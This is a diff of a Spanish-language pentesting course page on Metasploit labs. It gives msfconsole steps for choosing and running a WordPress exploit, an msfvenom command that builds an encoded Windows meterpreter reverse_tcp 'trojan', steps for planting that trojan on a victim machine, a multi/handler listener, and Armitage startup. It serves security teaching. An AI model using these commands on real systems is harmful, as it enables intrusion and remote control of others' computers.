@@ -14,7 +14,7 @@
         <link rel="prev" href="../wireshark-lab/">
       
       
-        <link rel="next" href="../metasploitableVM-setup/">
+        <link rel="next" href="../metasploitableVM/">
       
       
       <link rel="icon" href="../../assets/images/favicon.png">
@@ -64,6 +64,11 @@
     <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
+      
+        
+        <a href="#laboratorio-1-interaccion-basica" class="md-skip">
+          Skip to content
+        </a>
       
     </div>
     <div data-md-component="announce">
@@ -868,6 +873,18 @@
       
       
       
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Metasploit
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
       <a href="./" class="md-nav__link md-nav__link--active">
         
   
@@ -878,6 +895,50 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#laboratorio-1-interaccion-basica" class="md-nav__link">
+    <span class="md-ellipsis">
+      LABORATORIO 1 (INTERACCION BASICA)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#laboratorio-2-creacion-de-troyano-e-infiltracion-a-objetivo" class="md-nav__link">
+    <span class="md-ellipsis">
+      LABORATORIO 2 (CREACION DE TROYANO E INFILTRACION A OBJETIVO)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#laboratorio-3-interaccion-con-la-herramienta-armitage" class="md-nav__link">
+    <span class="md-ellipsis">
+      LABORATORIO 3 (INTERACCION CON LA HERRAMIENTA ARMITAGE)
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
       
     </li>
   
@@ -891,11 +952,11 @@
   
   
     <li class="md-nav__item">
-      <a href="../metasploitableVM-setup/" class="md-nav__link">
+      <a href="../metasploitableVM/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
-    Metasploitable VM Setup
+    Metasploitable VM
     
   </span>
   
@@ -913,11 +974,11 @@
   
   
     <li class="md-nav__item">
-      <a href="../nikto-metasploitable/" class="md-nav__link">
+      <a href="../nikto/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
-    Nikto en Metasploitable VM
+    Nikto (UNDER CONSTRUCTION)
     
   </span>
   
@@ -1063,6 +1124,41 @@
   
   
   
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#laboratorio-1-interaccion-basica" class="md-nav__link">
+    <span class="md-ellipsis">
+      LABORATORIO 1 (INTERACCION BASICA)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#laboratorio-2-creacion-de-troyano-e-infiltracion-a-objetivo" class="md-nav__link">
+    <span class="md-ellipsis">
+      LABORATORIO 2 (CREACION DE TROYANO E INFILTRACION A OBJETIVO)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#laboratorio-3-interaccion-con-la-herramienta-armitage" class="md-nav__link">
+    <span class="md-ellipsis">
+      LABORATORIO 3 (INTERACCION CON LA HERRAMIENTA ARMITAGE)
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
 </nav>
                   </div>
                 </div>
@@ -1079,21 +1175,21 @@
 
   <h1>Metasploit</h1>
 
-<p>EJERCICIO USO METASPLOIT</p>
+<h2 id="laboratorio-1-interaccion-basica">LABORATORIO 1 (INTERACCION BASICA)</h2>
 <ol>
-<li>Podemos ver la carpeta con los archivos de Metasploit Framework</li>
-</ol>
-<p><strong><em>cd /usr/share/metasploit-framework/</em></strong></p>
-<ol>
-<li>Ahora ejecutamos la consola de Metasploit: <strong><em>msfconsole</em></strong></li>
+<li>
+<p>Podemos ver la carpeta con los archivos de Metasploit Framework<br />
+<strong><em>cd /usr/share/metasploit-framework/</em></strong></p>
+</li>
+<li>
+<p>Ahora ejecutamos la consola de Metasploit: <strong><em>msfconsole</em></strong></p>
+</li>
 <li>Ahora podemos buscar de la siguiente forma: <strong><em>search Type: exploit</em></strong></li>
 <li>Podemos aplicar filtros ejemplo: <strong><em>search Type: exploit platform:windows</em></strong></li>
 <li>Buscar vulnerabilidades comunes: <strong><em>search cve:2017</em></strong></li>
 <li>Quiero atacar un sistema especifico: <strong><em>search name:wordpress</em></strong></li>
-<li>Si queremos usarlo: use &lt;ruta/nombre&gt;</li>
-</ol>
-<p>(<strong><em>use exploit/unix/webapp/wp_total_cache_exec</em></strong>)</p>
-<ol>
+<li>Si queremos usarlo: use &lt;ruta/nombre&gt;<br />
+(<strong><em>use exploit/unix/webapp/wp_total_cache_exec</em></strong>)</li>
 <li>Dentro podemos ver los objetivos: <strong><em>show targets</em></strong></li>
 <li>Podemos ver más información: <strong><em>show info</em></strong></li>
 <li>Podemos ver las opciones: <strong><em>show Options</em></strong></li>
@@ -1102,19 +1198,15 @@
 <li>Ahora veremos los Payloads útiles relacionados a este exploit: <strong><em>show payloads</em></strong></li>
 <li>Y podemos usar el payload de igual forma que antes con <strong><em>use &lt;name/ruta&gt;</em></strong></li>
 <li>Dentro podemos ver las opciones del Payload con <strong><em>show options</em></strong></li>
-<li>Y podemos establecer nuestra configuración del LOCAL HOST:</li>
-</ol>
-<p><strong><em>set LHOST &lt;IP MAQUINA ATACANTE&gt;</em></strong></p>
-<ol>
+<li>Y podemos establecer nuestra configuración del LOCAL HOST:<br />
+<strong><em>set LHOST &lt;IP MAQUINA ATACANTE&gt;</em></strong></li>
 <li>Y después de realizar todas las configuraciones de las opciones simplemente ejecutamos: <strong><em>exploit</em></strong></li>
 </ol>
 <p>Esto no hará nada en específico ya que faltarían más opciones para poder ver un resultado ya que esto solo es una explicación de cómo utilizar Metasploit framework en una prueba de ejemplo.</p>
-<p>EJERCICIO CREACION DE TROYANO E INFILTRACION A OBJETIVO</p>
+<h2 id="laboratorio-2-creacion-de-troyano-e-infiltracion-a-objetivo">LABORATORIO 2 (CREACION DE TROYANO E INFILTRACION A OBJETIVO)</h2>
 <ol>
-<li>En la terminal de Kali levantaremos el servicio PostgreSQL:</li>
-</ol>
-<p><strong><em>service postgresql start</em></strong></p>
-<ol>
+<li>En la terminal de Kali levantaremos el servicio PostgreSQL:<br />
+<strong><em>service postgresql start</em></strong></li>
 <li>Y abrimos la consola Metasploit: <strong><em>msfconsole</em></strong></li>
 <li>Ejecutamos: <strong>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP KALI&gt; LPORT=&lt;5555&gt; -f exe -e x86/shikata_ga_nai -i 10 &gt; trojan.exe</strong> (Mas adelante explicare cada configuración)</li>
 <li>Creado el archivo deberíamos tenerlo en /Home por lo que copiaremos y meteremos a la carpeta creada (winmount) en la práctica pasada conectada a la maquina windows para enviar el troyano a la maquina víctima.</li>
@@ -1147,7 +1239,7 @@
 <li><strong>use multi/handler:</strong> Este comando indica a Metasploit que se utilizará el módulo multi/handler, el cual es responsable de escuchar las conexiones entrantes de varios tipos de payloads. Seleccionar este módulo prepara Metasploit para recibir la conexión que será establecida por el payload que generamos previamente con msfvenom.</li>
 <li><strong>set payload windows/meterpreter/reverse_tcp</strong>: Este comando configura el tipo de payload que se espera recibir en el handler. En este caso, estamos configurando el payload para Windows que establece una conexión de Shell inversa usando el módulo Meterpreter de Metasploit Framework y el método reverse_tcp.</li>
 </ul>
-<p>EJERCICIO EXPLORACION HERRAMIENTA ARMITAGE</p>
+<h2 id="laboratorio-3-interaccion-con-la-herramienta-armitage">LABORATORIO 3 (INTERACCION CON LA HERRAMIENTA ARMITAGE)</h2>
 <ol>
 <li>Levantar el servicio postgresql en la terminal</li>
 <li>Ejecutamos Armitage: <strong><em>armitage</em></strong></li>
